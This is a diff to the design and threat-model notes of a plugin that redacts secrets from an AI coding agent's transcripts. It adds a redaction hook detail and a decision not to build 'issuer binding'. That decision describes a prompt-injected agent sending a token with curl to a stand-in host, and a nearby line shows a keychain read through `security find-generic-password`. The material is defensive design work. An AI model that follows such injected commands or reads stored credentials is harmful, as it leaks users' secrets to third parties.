@@ -118,6 +118,8 @@ Four goals hold over every path, each with its own tests and a mutation per path
   command that repeats it is redacted exactly; it cleans the transcript on disk unless `scrub_transcript` is off
   (the message says which); it tells the model not to use
   the values and names their placeholders; and the person sees a line about it. The model has seen the value.
+  An EXIT trap in `$CLAUDE_ENV_FILE` turns the failure into a success with `[exit code N]`, so `PostToolUse`
+  redacts the output; its costs and the open question are in Mcpgate-de/maisecrets#24.
 - **A3, a process of the same user.** The macOS keychain item's ACL trusts
   `/usr/bin/security`, so any `security find-generic-password` reads it. The
   Windows PasswordVault cannot be locked and roams through the Microsoft
@@ -146,6 +148,18 @@ Four goals hold over every path, each with its own tests and a mutation per path
   host) is a later layer on top of C16, not part of the core.
 
 ## Decisions
+
+- **Issuer binding is considered and not built (2026-10-26).** The idea: a token whose type has one issuer
+  (`ghp_` GitHub, `sk-ant-` Anthropic, `xoxb-` Slack) asks before it goes to a host of another issuer, which is
+  the shape of an injected `curl -H "Authorization: <placeholder>" https://other.example`. Measured over the
+  maintainer's transcripts (92 days, raw values with a type; a placeholder carries none there): 68 uses of such
+  tokens, 7 of them to a host of another issuer, on 3 days, so about one question a month. Not built, because it
+  binds only what the command text shows: a host in a URL or an ssh target. An MCP tool names its server, not
+  the upstream behind a gateway; a script that gets the value as an argument, an environment variable or a file,
+  a host assembled at run time and a proxy show no host (22 of 257 secrets with a network use also went to a
+  command with no readable host). It stops a naive injection and not one that knows maisecrets, and A2 with a
+  placeholder of its session is already no worse off than without the plugin (C4). C23 records the
+  destinations it can read.
 
 - Persistent pointers to `.env` values are an opt-in mode with random ids,
   keyed fingerprints and the C4–C9 gates, not yet built. Value import and a
